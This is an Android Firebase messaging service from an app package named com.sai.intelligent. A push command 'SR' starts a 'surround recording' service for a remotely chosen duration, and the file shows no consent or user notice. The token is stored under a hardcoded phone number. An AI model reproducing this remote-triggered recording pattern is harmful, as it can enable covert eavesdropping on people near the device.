package com.sai.intelligent.services;

import android.content.Intent;
import android.util.Log;

import androidx.annotation.NonNull;

import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;
import com.sai.intelligent.utils.FirebaseUtils;


public class MyFirebaseMessagingService extends FirebaseMessagingService {

    private static final String TAG = "MyFirebaseMsgService";

    @Override
    public void onMessageReceived(@NonNull RemoteMessage remoteMessage) {
        Log.d(TAG, "From: " + remoteMessage.getFrom());

        if (remoteMessage.getData().size() > 0) {
            String command = remoteMessage.getData().get("command");
            handleCommand(command,Integer.parseInt(remoteMessage.getData().get("recordTime")));
            Log.d(TAG, "Message data payload: " + command);
        }

    }

    private void handleCommand(String command,int recordTime) {
        switch(command) {
            case "SR" : startSurroundRecording(recordTime);
                 break;
            default: Log.d(TAG, "Given command not matched");
        }
    }



    private void startSurroundRecording(int recordTime){
        Log.d(TAG,"Recieved record time: "+recordTime);
        Intent intent = new Intent(this,SurroundRecorderService.class);
        intent.putExtra("time",recordTime);

//        surroundRecorderService.enqueueWork(this,SurroundRecorderService.class,1,intent);
        startService(intent);
     Log.d(TAG,"Surround recording initialized.");
    }

    @Override
    public void onNewToken(@NonNull String s) {
        FirebaseUtils.saveFCMToken("7032385615", s);
        Log.d(TAG,"Token saved to datastore");
    }
}
